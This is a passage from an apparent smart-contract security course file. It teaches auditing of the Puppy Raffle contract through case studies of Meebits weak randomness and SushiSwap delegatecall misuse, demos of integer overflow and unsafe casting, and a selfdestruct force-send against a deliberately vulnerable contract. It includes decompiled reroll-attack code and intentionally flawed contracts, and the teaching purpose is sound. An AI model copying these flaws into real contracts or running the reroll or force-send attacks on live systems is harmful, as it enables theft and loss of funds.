          Remember, periodically conducting post mortems like this greatly contributes towards honing your skills as a security researcher. Familiarity begets mitigation.

          ### Case Study: Meebits - Insecure Randomness

          Meebits, created by Larva Labs (team behind CryptoPunks), was exploited in May 2021 due to insecure randomness in its smart contracts. By rerolling their randomness, an attacker was able to obtain a rare NFT which they sold for $700k.

          The concept behind Meebits was simple. If you owned a CryptoPunk, you could mint a free Meebit NFT. The attributes of this newly minted NFT were supposed to be random, with some traits being more valuable than others. However, owing to exploitable randomness, the attacker could reroll their mint until they obtained an NFT with desirable traits.

          ### How the Attack Happened

          There were 4 distinct things that occured.

          **Metadata Disclosure:** The Meebit contract contained an IPFS hash which pointed to metadata for the collection. Within the Metadata there existed a string of text that clearly disclosed which traits would be the most rare

              "...While just five of the 20,000 Meebits are of the dissected form, which is the rarest. The kinds include dissected, visitor, skeleton, robot, elephant, pig and human, listed in decreasing order of rarity."

          In addition to this, the `tokenURI` function allowed public access to the traits of your minted Meetbit, by passing the function your tokenId.

          **Insecure Randomness:** Meebits calculated a random index based on this line of code:

          ```js
          uint index = uint(keccak256(abi.encodePacked(nonce, msg.sender, block.difficulty, block.timestamp))) % totalSize;
          ```

          This method to generate an index is used within Meebit's `randomIndex` function when minting an NFT.

          ```js
          function _mint(address _to, uint createdVia) internal returns (uint) {
                  require(_to != address(0), "Cannot mint to 0x0.");
                  require(numTokens < TOKEN_LIMIT, "Token limit reached.");
                  uint id = randomIndex();

                  numTokens = numTokens + 1;
                  _addNFToken(_to, id);

                  emit Mint(id, _to, createdVia);
                  emit Transfer(address(0), _to, id);
                  return id;
              }
          ```

          **Attacker Rerolls Mint Repeatedly:** The attacker in this case deployed a contract which did two things.

          1. Calls `mint` to mint an NFT
          2. Checks the 'random' Id generated and reverts the `mint` call if it isn't desirable.

          The attack contract wasn't verified, but if we decompile its bytecode we can see the attack function.

          ```js
          function 0x1f2a8a19(uint256 varg0) public nonPayable {
              require(msg.data.length -4 >= 32);
              require(bool(stor_2_0_19.code.size));
              v0, /*uint256*/ v1 = stor_2_0_19.mintWithPunkOrGlyph(varg0).gas(msg.gas);
              require(bool(v0), 0, RETURNDATASIZE());
              require(RETURNDATASIZE() >= 32);
              assert(bool(uint8(map_1[v1]))==bool(1));
              v2 = address(block.coinbase).call().value(0xde0b6b3a7640000);
              require(bool(v2), 0, RETURNDATASIZE());
          }
          ```

          The above my be a little complex, but these are the important lines to note:

          ```js
          v0, /*uint256*/ (v1 = stor_2_0_19.mintWithPunkOrGlyph(varg0).gas(msg.gas));
          ```

          and

          ```js
          assert(bool(uint8(map_1[v1])) == bool(1));
          ```

          The first line is where the mint function is being called by the attacking contract.

          The second line is where an assertion is made that the minted NFT has the desired rare traits. If this assersion fails, the whole transaction is reverted.

          **Attacker Receives Rare NFT:**

          The attacking contract called this mint function and reverted for over 6 hours. Spending ~$20,000/hour in gas until they minted the rare NFT they wanted Meebit #16647. The NFT possessed a Visitor trait and sold for ~$700,000.

          <img src="/security-section-4/27-weak-randomness-case-study/meebit1.png" style="width: 75%; height: auto;">

          ### Wrap Up

          There you have it. That's how an attacker in 2021 was able to exploit weak randomness in the Meetbits contract.

          Thanks again to Andy! In the next lesson we'll be going over how to prevent this madness!
        description: 'NFT product Mebits attacked, obtained rare NFT worth almost $1M; weak security measures.'
      -
        id: dde6f9a7-4b37-4472-bfdc-0d0b894b01cb
        type: new_lesson
        enabled: true
        title: 'Weak randomness: Mitigation'
        slug: weak-randomness-mitigation
        duration: 1
        video_url: mJOyBovWIwZYszgVMcBetmpet4VbtRP3YXyzwpwblrk
        raw_markdown_url: /routes/security/4-puppy-raffle/28-weak-randomness-mitigation/+page.md
        markdown_content: |-
          ---
          title: Weak Randomness - Mitigation
          ---

          _Follow along with this video:_

          ---

          ### Mitigating Weak Randomness

          In short, relying on on-chain data to generate random numbers is problematic due to the deterministic nature of the blockchain. The easiest way to mitigate this is to generate random numbers off-chain.

          Some off-chain solutions include:

          **Chainlink VRF:** "A provably fair and verifiable random number generator (RNG) that enables smart contracts to access random values without compromising security or usability. For each request, Chainlink VRF generates one or more random values and cryptographic proof of how those values were determined. The proof is published and verified on-chain before any consuming applications can use it. This process ensures that results cannot be tampered with or manipulated by any single entity including oracle operators, miners, users, or smart contract developers." - I encourage you to [**check out the Docs**](https://docs.chain.link/vrf).

          **Commit Reveal Scheme:** "The scheme involves two steps: commit and reveal.

          During the commit phase, users submit a commitment that contains the hash of their answer along with a random seed value. The smart contract stores this commitment on the blockchain. Later, during the reveal phase, the user reveals their answer and the seed value. The smart contract then checks that the revealed answer and the hash match, and that the seed value is the same as the one submitted earlier. If everything checks out, the contract accepts the answer as valid and rewards the user accordingly." - Read more in this [**Medium Article**](https://medium.com/coinmonks/commit-reveal-scheme-in-solidity-c06eba4091bb)!
        description: 'Chainlink VRF for trustless randomness in apps, Patrick explains. No to alternative methods.'
      -
        id: 3c4d644f-5c2f-4298-a398-ab81c8d9e0b9
        type: new_lesson
        enabled: true
        title: 'Exploit: Integer overflow'
        slug: exploit-integer-overflow
        duration: 8
        video_url: rqT5q00UWGMM7yy82yK02h3655YYtJV832DU8yhhOWCR4
        raw_markdown_url: /routes/security/4-puppy-raffle/29-exploit-integer-overflow/+page.md
        markdown_content: |-
          ---
          title: Exploit - Integer Overflow
          ---

          _Follow along with this video:_

          ---

          ### Continuing with selectWinner

          We've only just started with the `selectWinner` function and we've already found another issue. Let's keep going and see if we can find more.

          ```js
          function selectWinner() external {
                  require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
                  require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
                  uint256 winnerIndex =
                      uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
                  address winner = players[winnerIndex];
                  // @Audit: Why the calculationi for totalAmountCollected, why not address(this).balance?
                  uint256 totalAmountCollected = players.length * entranceFee;
                  // @Audit:80% prizePool, 20% fee. Is this correct? Arithmatic may lead to precision loss
                  uint256 prizePool = (totalAmountCollected * 80) / 100;
                  uint256 fee = (totalAmountCollected * 20) / 100;
                  // @Audit: Total fees the owner should be able to collect. Why the casting? Overflow.
                  totalFees = totalFees + uint64(fee);

                  ...
          ```

          Assessing the function snippet above I notice a few things that may be worth noting in our `notes.md` and/or by leaving in-line notes like shown.

          ```js
          totalFees = totalFees + uint64(fee);
          ```

          This line in particular sets my alarm bells off. My experience tells me that this is at risk of `integer overflow`. This is a bit of a classic issue, as newer versions of Solidity (>=0.8.0) are protected from it.

          Head back to [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) and let's have a closer look at how this works.

          Navigating to `src/arithmetic/OverflowAndUnderflow.sol` we can see a simple example of how this works.

          ```js
          contract Overflow {
              uint8 public count;

              // uint8 has a max value of 255, so if we add 1 to 255, we get 0 if it's unchecked!
              // Versions prior to 0.8 of solidity also have this issue
              function increment(uint8 amount) public {
                  unchecked {
                      count = count + amount;
                  }
              }
          }
          ```

          `unchecked` is a keyword in later versions of Solidity, this is being used to tell the compiler not to check for things like overflow. In earlier versions of Solidity (prior to 0.8.0) there were no checks by default.

          ### Overflow Remix Example

          We've provide a [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/arithmetic/OverflowAndUnderflow.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) to experiment with and get a sense of things.

          By compiling and deploying our `Overflow.sol` contract, we should be met with this:

          <img src="/security-section-4/29-exploit-integer-overflow/overflow1.png" style="width: 75%; height: auto;">

          The max value of a uint8 is 255. Our `count` variable starts at 0, so let's just pick a number to start with, say 200.

          <img src="/security-section-4/29-exploit-integer-overflow/overflow2.png" style="width: 75%; height: auto;">

          Calling increment updates our `count` variable. No problem so far. Now let's add 60 to our number. `count` should total 260, but what do you think we'll get?

          <img src="/security-section-4/29-exploit-integer-overflow/overflow3.png" style="width: 75%; height: auto;">

          We get 4! This is because our integer is hitting the cap of 255, and then wrapping back to 0.

          > **Note:** This true for ints and uints in all versions of Solidity **prior to** 0.8.0.
          >
          > In Solidity versions 0.8.0+ `unchecked` is required to expose this vulnerability. Uints and ints are `checked` by default. If a max is surpassed in these versions, the transaction will revert.

          The situation is the same in circumstances of `underflow`. An integer will wrap to the max value if reduced past it's limit. You can practice this with our remix example as well.

          ```js
          contract Underflow {
              uint8 public count;

              // uint8 has a min value of 0, but if we subtract 1 from 0, we get 255 if it's unchecked!
              // Versions prior to 0.8 of solidity also have this issue
              function decrement() public {
                  unchecked {
                      count--;
                  }
              }
          }
          ```

          ### Precision Loss

          The last vulnerability outlined in this repo is `precision loss`.

          ```js
          contract PrecisionLoss {
              uint256 public moneyToSplitUp = 225;
              uint256 public users = 4;

              // This function will return 56, but we want it to return 56.25
              function shareMoney() public view returns (uint256) {
                  return moneyToSplitUp / users;
              }
          }
          ```

          <img src="/security-section-4/29-exploit-integer-overflow/overflow4.png" style="width: 75%; height: auto;">

          At its root, this is because Solidity doesn't support float point numbers. Any time we're performing a division operation, we need to be aware of this potential loss of precision.

          ### Wrap Up

          A Proof of Concept/Code for this vulnerability should be pretty straightforward, so I won't be walking through one, but I challenge you to write one yourself.

          If you get stuck - you can check out the [**audit-data**](https://github.com/Cyfrin/4-puppy-raffle-audit/tree/audit-data) branch of the Puppy Raffle Repo for guidance. **_Don't Cheat!_**

          Let's keep going!
        description: 'Bug in smart contract due to arithmetic overflow; demonstrates with Solidity code & offers solutions.'
      -
        id: b9ba2a58-137e-4622-a91d-f0f28eff6c01
        type: new_lesson
        enabled: true
        title: 'Integer overflow: Mitigation'
        slug: integer-overflow-mitigation
        duration: 2
        video_url: g4oqGIg7hF0102exQnyBhNlaAB2OsX6WKuZ8wYRr02Gns8
        raw_markdown_url: /routes/security/4-puppy-raffle/30-integer-overflow-mitigation/+page.md
        markdown_content: |-
          ---
          title: Integer Overflow - Mitigation
          ---

          _Follow along with this video:_

          ---

          ### Mitigation

          Integer over/underflow is actually fairly straightforward to mitigate against.

          ```js
          function selectWinner() external {
              require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
              require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
              uint256 winnerIndex =
                  uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
              address winner = players[winnerIndex];
              uint256 totalAmountCollected = players.length * entranceFee;
              uint256 prizePool = (totalAmountCollected * 80) / 100;
              uint256 fee = (totalAmountCollected * 20) / 100;
              // @Audit: Newer version of Solidity, Bigger Uints
              totalFees = totalFees + uint64(fee);
          ```

          In our `Puppy Raffle` protocol we would likely suggest a newer Solidity version. The use of a `uint64` is also just silly.

          Foundry allows us to verify the max sizes of the numbers really conveniently through a `chisel` command. Typing `chisel` will start `chisel`, the command `type(uint64).max` will give an output like this:

          ```bash
          Welcome to Chisel! Type `!help` to show available commands.
          ‚ûú type(uint64).max
          Type: uint
          ‚îú Hex: 0x000000000000000000000000000000000000000000000000ffffffffffffffff
          ‚îî Decimal: 18446744073709551615
          ‚ûú
          ```

          _18 ETH due to having 18 decimal places_

          If `Puppy Raffle` receives more than 18 ETH in fees, we're going to see overflow issues!

          Experiment with `chisel` and try different `uint/int` types to get a sense for how big/small some of these common numbers are!
        description: 'Fixing Solidity Arithmetic Issues: Use Newer Version'
      -
        id: 34856ce8-f62b-469b-bc59-c053b97d3e69
        type: new_lesson
        enabled: true
        title: 'Exploit: Unsafe casting'
        slug: unsafe-casting
        duration: 4
        video_url: YBvahGC3O2RcQLtPsOCuU6901UQsygpBjZ8Ew3AIIrg4
        raw_markdown_url: /routes/security/4-puppy-raffle/31-unsafe-casting/+page.md
        markdown_content: |-
          ---
          title: Unsafe Casting
          ---

          _Follow along with this video:_

          ---

          ### Unsafe Casting Breakdown

          There's another issue with the line `totalFees = totalFees + uint64(fee)` that's similar to integer overflow, but a little different.

          Using `chisel` again, we can see that a max `uint64` is 18446744073709551615.

          ```bash
          Welcome to Chisel! Type `!help` to show available commands.
          ‚ûú type(uint64).max
          Type: uint
          ‚îú Hex: 0x000000000000000000000000000000000000000000000000ffffffffffffffff
          ‚îî Decimal: 18446744073709551615
          ‚ûú
          ```

          We've also learnt that adding any to this number is going to wrap around to 0 again, but what happens if we try to cast a larger number into this smaller container?

          <img src="/security-section-4/31-unsafe-casting/unsafe-casting1.png" style="width: 75%; height: auto;">

          We can see above that when `20e18` is cast as a `uint64` the returned value is actually the difference between `type(uint64).max` and `20e18`.

          Our value has wrapped on us again!

          ```js
          // twentyEth         = 20000000000000000000
          // type(uint64).max  = 18446744073709551615
          // uint64(twenthEth) =  1553255926290448384
          ```

          This is absolutely something we're caalling out in our audit report. Puppy Raffle is at risk of losing so many fees!
        description: 'Overflow issue: Loss of significant digits due to uint64 casting from uint256, leading to lost fees. Importance of identifying & fixing in audit reports.'
      -
        id: 0f511af4-595c-4b3e-bd92-dabb16222f66
        type: new_lesson
        enabled: true
        title: 'Recon II'
        slug: recon-continued-2
        duration: 11
        video_url: ihCoLDxSFounXaGL3sGS5MJtjUS00e9MIj5B02RPwJ59w
        raw_markdown_url: /routes/security/4-puppy-raffle/32-recon-continued-2/+page.md
        markdown_content: |-
          ---
          title: Recon Continued 2
          ---

          _Follow along with this video:_

          ---

          ### Continuing Reconnaissance

          We've already found **two** big bugs in this selectWinner function! This is great, let's continue down the code and see what else we uncover.

          The next line in our code is `uint256 tokenId = totalSupply()`. It may be worth confirming where `totalSupply()` is coming from and making some in-line notes of questions to answer later.

          ```js
          ...
              //
              uint256 tokenId = totalSupply();

              // We use a different RNG calculate from the winnerIndex to determine rarity
              uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
              if (rarity <= COMMON_RARITY) {
                  tokenIdToRarity[tokenId] = COMMON_RARITY;
              } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
                  tokenIdToRarity[tokenId] = RARE_RARITY;
              } else {
                  tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
              }

              delete players;
              raffleStartTime = block.timestamp;
              previousWinner = winner;
              (bool success,) = winner.call{value: prizePool}("");
              require(success, "PuppyRaffle: Failed to send prize pool to winner");
              _safeMint(winner, tokenId);
          }
          ```

          We can see that `totalSupply()` is coming from our `ERC721 inheritance` and is returning `_tokenOwners.length`

          ```js
          function totalSupply() public view virtual override returns (uint256) {
              // _tokenOwners are indexed by tokenIds, so .length() returns the number of tokenIds
              return _tokenOwners.length();
          }
          ```

          ERC721 is a very common token standard and tokenSupply is a well known function within it. You should absolutely familiarize yourself with these concepts. Ultimately things look good here, but we may want to make note:

          ```js
          // @Audit: Where is tokenId/tokenSupply being incremented?
          uint256 tokenId = totalSupply();
          ```

          Continuing with our `selectWinner` function we next see that a token rarity is being determined. `Weak Randomness` is seen again! Something to note is - any time I see constants being used, I like to verify what they are. In this case the constants in this code are representing percentage changes of obtaining a giving rarity.

          ```js
          // @Audit: Weak Randomness
          uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
          //
          if (rarity <= COMMON_RARITY) {
              tokenIdToRarity[tokenId] = COMMON_RARITY;
          } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
              tokenIdToRarity[tokenId] = RARE_RARITY;
          } else {
              tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
          }
          ```

          Following this, our function performs a number of state changes. Let's make note of what each of these is actually doing.

          ```js
          delete players; // resetting the players array
          raffleStartTime = block.timestamp; // resetting the raffle start time
          previousWinner = winner; // vanity, doesn't impact much
          ```

          Finally we see calls to send the `prizePool` and mint the NFT to the winner.

          ```js
          (bool success,) = winner.call{value: prizePool}("");
          require(success, "PuppyRaffle: Failed to send prize pool to winner");
          _safeMint(winner, tokenId);
          ```

          We may even suspect that `re-entrancy` is a risk here, given the order of these lines. So let's verify!

          When a call is made externally, we should always ask ourselves what could happen in different scenarios.

          - _What if the recipient is a smart contract?_

          - _What if the contract doesn't have a receive/fallback function or forces a revert?_

          - _What if the recipient calls another function through receive/fallback?_

          The more experience you gain performing security reviews, the better your intuition will be about which questions to ask and what to watch out for.

          In this particular circumstance, we see that the `selectWinner` function includes require statements that would prevent re-entrancy at this point in this code as we've already reset these state variables. Whew!

          ```js
          require(block.timestamp >=
            raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
          require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
          ```

          However, if the winner had a broken `receive` function, `selectWinner` here would fail, it could actually be quite difficult to select a winner in that situation! We'll discuss impact and reporting of that a little later.

          ```js
          // @Audit: Winner wouldn't be unable to receive rewards if fallback function was broken!
          (bool success,) = winner.call{value: prizePool}("");
          require(success, "PuppyRaffle: Failed to send prize pool to winner");
          _safeMint(winner, tokenId);
          ```

          Alright, we've completed a fairly thorough walkthrough of `selectWinner`, let's move onto the next function `withdrawFees`.

          > As always there may be more bugs in these repos than we go over, keep a look out!

          ### Risks in withdrawFees

          ```js
          function withdrawFees() external {
              require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
              uint256 feesToWithdraw = totalFees;
              totalFees = 0;
              (bool success,) = feeAddress.call{value: feesToWithdraw}("");
              require(success, "PuppyRaffle: Failed to withdraw fees");
          }
          ```

          So, let's break this function down to see what it's doing.

          First we see a require statement and already a couple questions come to mind _Hint: there are issues with this line_

          ```js
          // @Audit: If there are players, fees can't be withdrawn, does this make withdrawl difficult?
          require(address(this).balance ==
            uint256(totalFees), "PuppyRaffle: There are currently players active!");
          ```

          The next two lines are resetting our `totalFees`, seems fine.

          ```js
          uint256 feesToWithdraw = totalFees;
          totalFees = 0;
          ```

          And finally we reach the external call which distributes the fees. It's worth noting that the address isn't the `owner`, fees are being sent to the `feeAddress` which our earlier `NatSpec` advises is controllable by the `owner`

          ```js
          // @Audit: What if the feeAddress is a smart contract with a fallback/receive which reverts?
          (bool success,) = feeAddress.call{value: feesToWithdraw}("");
          require(success, "PuppyRaffle: Failed to withdraw fees");
          ```

          ### Wrap Up

          We've covered two more functions in `Puppy Raffle` and I think we're on the trail of a couple more bugs. In the next lesson, lets answer some of the questions we asked here and look at better practices to employ in protocols such as these.
        description: 'Patrick continues his reconnaissance of PuppyRaffle!'
      -
        id: 019b4cd0-68fa-4a16-875c-f0918266a4fd
        type: new_lesson
        enabled: true
        title: 'Exploit: Mishandling Of ETH'
        slug: exploit-mishandling-of-eth
        duration: 3
        video_url: YO2OKZVHcm7s02BSNdKdBsOuOGuJO9yFMpDUZzt00Z2024
        raw_markdown_url: /routes/security/4-puppy-raffle/33-exploit-mishandling-of-eth/+page.md
        markdown_content: |-
          ---
          title: Exploit - Mishandling of Eth
          ---

          _Follow along with this video:_

          ---

          ### Eth Handling

          Let's pause a moment and focus on this line:

          ```js
          require(address(this.balance) ==
            uint256(totalFees), "PuppyRaffle: there are currently players active!");
          ```

          Effectively, we're checking to assure that we don't withdraw funds that are current in a raffle.

          Maybe we're just being extra cautious. The idea behind using `address(this).balance` is that - beyond entering the raffle - there's no way this contract can receive funds, so this require should always be ok ... right?

          ### No Receive, No Fallback, No Problem.

          Puppy Raffle's hope is that without a receive or fallback function, there should never be a way for this accounting to imbalance. Well, let's test it out.

          ```js
          function testCantSendMoneyToRaffle() public {
              address sendAddy = makeAddr("sender");
              vm.deal(sendAddy, 1 ether);
              vm.expectRevert();
              vm.prank(sendAddy);
              (bool success, ) = payable(address(puppyRaffle)).call{value: 1 ether}("");
              require(success);
          }
          ```

          <img src="/security-section-4/33-exploit-mishandling-eth/exploit-mishandling-eth1.png" style="width: 75%; height: auto;">

          Running this test, we discover ... it passes! So we're done, right? Everything's secure?

          Not exactly.

          ### Wrap Up

          It may seem like everything is fine here and that the protocol's accounting is secure, but when it comes to the handling of Eth there can be many pitfalls and gotchas you need to look out for.

          In the next lesson, we'll return to our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo to investigate how Puppy Raffle may still be vulnerable in this broad category.
        description: 'Identifying the mishandling of ETH in PuppyRaffle and outlining issue with relying on .balance in contract accounting.'
      -
        id: 2f8971e7-ff01-4196-b83f-a56ba0eb81fc
        type: new_lesson
        enabled: true
        title: 'Mishandling of ETH: Minimized'
        slug: mishandling-of-eth-minimized
        duration: 6
        video_url: D02cjLBEIt1fXDMpU9JzEPRexaBU3Jg3egzhJE02wPxnY
        raw_markdown_url: /routes/security/4-puppy-raffle/34-mishandling-of-eth-minimized/+page.md
        markdown_content: |-
          ---
          title: Mishandling of Eth - Minimized
          ---

          _Follow along with this video:_

          ---

          ### Mishandling of Eth

          To see this vulnerability in action we're going to again reference our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo!

          There are two situational examples available for `Mishandling of Eth` for this lesson we want [**Remix (Vulnerable to selfdestruct)**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/mishandling-of-eth/SelfDestructMe.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).

          > Remember: The codebase is available on the [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/mishandling-of-eth/SelfDestructMe.sol) repo as well, if you want to test things locally.

          ### Remix Example

          We've done this a few times, so we should be familiar with the process - go ahead and compile our `SelfDestructMe.sol` contract and deploy.

          You'll likely be met with this message, `selfdestruct` is being heavily considered for deprecation, but for now this vulnerability still exists, so we can ignore this message for now.

          <img src="/security-section-4/34-mishandling-eth-minimized/mishandling-eth-minimized1.png" style="width: 50%; height: auto;">

          <details>
          <summary>SelfDestructMe.sol</summary>

          ```js
          contract SelfDestructMe {
              uint256 public totalDeposits;
              mapping(address => uint256) public deposits;

              function deposit() external payable {
                  deposits[msg.sender] += msg.value;
                  totalDeposits += msg.value;
              }

              function withdraw() external {
                  /*
                      Apparently the only way to deposit ETH in the contract is via the `deposit` function.
                      If that were the case, this strict equality would always hold.
                      But anyone can deposit ETH via selfdestruct, or by setting this contract as the target
                      of a beacon chain withdrawal.
                      (see last paragraph of this section
                      https://eth2book.info/capella/part2/deposits-withdrawals/withdrawal-processing/#performing-withdrawals),
                      regardless of the contract not having a `receive` function.

                      If anybody deposits ETH that way, then the equality breaks and the contract is DoS'd.
                      To fix it, the code could be changed to >= instead of ==. Which means that the available
                      ETH balance should be _at least_ `totalDeposits`, which makes more sense.
                  */
                  assert(address(this).balance == totalDeposits); // bad

                  uint256 amount = deposits[msg.sender];
                  totalDeposits -= amount;
                  deposits[msg.sender] = 0;

                  payable(msg.sender).transfer(amount);
              }
          }
          ```

          </details>
          <br>

          `SelfDestructMe.sol` is a fairly straightforward contract at a glance, experiment with the basic functions of the contract as you wish.

          A user is able to deposit funds, which updates their balance as well as the `totalDeposits` variable. A user can also call `withdraw`, this function checks that the contract's balance is still equal to the `totalDeposits` and if so will updates balances and transfer funds.

          I've deposited 1 Ether to the contract, here.

          <img src="/security-section-4/34-mishandling-eth-minimized/mishandling-eth-minimized2.png" style="width: 50%; height: auto;">

          The issue comes from this line:

          ```js
          assert(address(this).balance == totalDeposits);
          ```

          The core of this vulnerability is the assumption that, without a `receive` or `fallback` function, the only way to send value to this contract is through the deposit function.

          This is **_false_**.

          Go ahead and deploy the `AttackSelfDestructMe.sol` contract. The constructor requires an attack target, so be sure to copy the address for `SelfDestructMe.sol` and pass it to your deploy. Give the contract a balance during deployment as well.

          <img src="/security-section-4/34-mishandling-eth-minimized/mishandling-eth-minimized3.png" style="width: 50%; height: auto;">

          Now, when the attack function is called, `selfdestruct` will be triggered, and we expect to see our 5 Ether forced onto `SelfDestructMe.sol`.

          And, that's exactly what we see:

          <img src="/security-section-4/34-mishandling-eth-minimized/mishandling-eth-minimized4.png" style="width: 50%; height: auto;">

          Lastly, try calling the `withdraw` function on `SelfDestructMe.sol`. It reverts! The contract's accounting has been broken and it's balance is now stuck!

          <img src="/security-section-4/34-mishandling-eth-minimized/mishandling-eth-minimized5.png" style="width: 75%; height: auto;">

          ### Wrap Up

          We've illustrated how relying on a contract's balance as a means of internal counting can be risky. There's really no way to be certain that arbitrary value isn't sent to a contract currenty.

          As I'd mentioned previously, the concept of `Mishandling Eth` is a broad one. Our sc-exploits-minimized repo outlines another common scenario (push over pull) that I encourage you to look at, as we won't go over it here.

          Ultimately, this is another finding for sure - let's make note of it.

          ```js
          // @Audit: Mishandling Eth
          function withdraw() external {...}
          ```
        description: 'How ETH Misuse Leads to Smart Contract Vulnerability, Patrick Explains Solutions'
      -
        id: dd969938-351d-4952-af95-7ad356d5daaa
        type: new_lesson
        enabled: true
        title: 'Case Study: Mishandling of ETH'
        slug: mishandling-of-eth-case-study
        duration: 3
        video_url: jEarsr8ctgtmxVcGQ72Wn8m4kbX9t2KWQF4G101Y02BAs
        raw_markdown_url: /routes/security/4-puppy-raffle/35-mishandling-of-eth-case-study/+page.md
        markdown_content: |-
          ---
          title: Mishandling of Eth - Case Study
          ---

          _Follow along with this video:_

          ---

          ### Case Study: Sushi Swap

          In this lesson we'll be briefly detailing how the `Mishandling of Eth` vulnerability lead to catastrophic consequences in the case of Sushi Swap.

          One of the best things you can do to grow your skills as a security researcher is to read case studies and familiarize yourself with hacks. We've included, in the [**course repo**](https://github.com/Cyfrin/security-and-auditing-full-course-s23), a link to [**an article**](https://samczsun.com/two-rights-might-make-a-wrong/) illustrating the case study we'll be going over briefly.

          Now, the situation with Sushi Swap is different from what we've seen in other example, because again - `Mishandling of Eth` is a very broad category. Ultimately the issue was with this function:

          ```js
          function batch(bytes[] calldata calls, bool revertOnFail) external payable returns (bool[] memory successes, bytes[] memory results) {
              successes = new bool[](calls.length);
              results = new bytes[](calls.length);
              for (uint256 i = 0; i < calls.length; i++) {
                  (bool success, bytes memory result) = address(this).delegatecall(calls[i]);
                  require(success || !revertOnFail, _getRevertMsg(result));
                  successes[i] = success;
                  results[i] = result;
              }
          }
          ```

          In the simplest terms, this function allows a user to compile multiple calls into a single transaction - sounds useful.

          The oversight was in the use of `delegatecall`. When implementing delegatecall, msg.sender _and_ msg.value are persistant. This meant that a single value sent for one call in this function could be used for multiple calls!

          > **For example:** If I were to call a function which cost 1 Eth, to call it 100 times, it should cost 100 Eth. In the case of the `batch` function, a user would be able to call the function 100 times, for only 1 Eth!

          ### Wrap Up

          I highly encourage you to read through the provided article and familiarize yourself with the Sushi Swap case. Vulnerabilities when handling Eth without care come in many shapes and sizes. We've gone through a few examples in the last few lessons that I hope instill an understanding of the care that should be taken when dealing with funds.

          In the next lesson we'll continue our Puppy Raffle Recon!
        description: 'SushiSwap attack: Poor handling of ETH led to a real-life attack, causing significant monetary loss. Read detailed case study.'
      -
        id: 85c941ab-17a5-4fb7-855f-ffcad2e2099d
        type: new_lesson
        enabled: true
        title: 'Recon III'
        slug: recon-continued-3
        duration: 7
        video_url: ROxQ01UHkXgowLtHWWqW77DEAxoBV84qh91MgbWbNwH00
        raw_markdown_url: /routes/security/4-puppy-raffle/36-recon-continued-3/+page.md
        markdown_content: |-
          ---
          title: Recon Continued 3
          ---

          _Follow along with this video:_

          ---

          ### Recon Continued

          We're doing great so far and have uncovered lots - we definitely shouldn't stop now. The next function we'll approach is `changeFeeAddress`.

          ### changeFeeAddress

          ```js
          /// @notice only the owner of the contract can change the feeAddress
          /// @param newFeeAddress the new address to send fees to
          function changeFeeAddress(address newFeeAddress) external onlyOwner {
              feeAddress = newFeeAddress;
              emit FeeAddressChanged(newFeeAddress);
          }
          ```

          To begin with, let's look into the `changeFeeAddress` function. This function ensures that only the contract owner can make changes to the contract's `feeAddress`. The modifier `onlyOwner` that is used in this function is sourced from the OpenZeppelin library. We can (and should) inspect these functions to assure access control is working as we'd expect - it is.

          ```javascript
          /**
           * @dev Throws if called by any account other than the owner.
           */
          modifier onlyOwner() {
              require(owner() == _msgSender(), "Ownable: caller is not the owner");
              _;
          }
          ```

          `changeFeeAddress` then sets the `feeAddress` variable to the new address provided, and finally emits an event.

          > Whoops! - events should be emitted after state changes, we haven't seen many events til now, we may need to return to previous functions to verify!

          Things look fine with `changeFeeAddress`, what's next?

          ## \_isActivePlayer

          ```javascript
          /// @notice this function will return true if the msg.sender is an active player
          function _isActivePlayer() internal view returns (bool) {
              for (uint256 i = 0; i < players.length; i++) {
                  if (players[i] == msg.sender) {
                      return true;
                  }
              }
              return false;
          }
          ```

          Now, we haven't seen this referenced anywhere before now, we may want to simply investigate when this function is being used.

          <img src="/security-section-4/36-recon-continued-3/recon-continued1.png" style="width:75%; height:auto;">

          Ironically, it seems this function isn't being used anywhere in our protocol!

          We would have to ask ourselves of course:

          ```js
          // Impact:
          // Likelihood:
          ```

          Given that this is an `internal` function that is never called - the `impact` and `likelihood` are both realistically going to be `None`. With that said, this function is clearly a waste of gas.

          When we complete our write up, it's likely this will be an `Informational` or `Gas` severity.

          ### \_baseURI

          ```js
          /// @notice this could be a constant variable
          function _baseURI() internal pure returns (string memory) {
              return "data:application/json;base64,";
          }
          ```

          The next function down is `_baseURI`. This seems pretty straightforward. It looks like it provides a base for a tokenURI used for an SVG NFT implementation.

          > **Note:** If this is confusing to you, absolutely review the Foundry Full Course. NFTs are a huge part of DeFi and you _need_ to know this stuff intimately.

          ### tokenURI

          Skimming through the `tokenURI` function, nothing initially sticks out as unusual. A few things we would want to check would be:

          - Assuring tokens have their rarity properly assigned.
          - Verifying mapping for `rarityToUri` and `rarityToName` and where they are set.
          - Double checking that the image URIs work for each rarity.

          The function then ends in a whole bunch of encoding stuff. It's pretty heavy, so we're not going to go through it too deeply. There may be some redundancy here - I challenge you to sus it out - but for the most part this is good.

          Definitely be thinking about _how can I break this view function?_

          ### Wrap Up

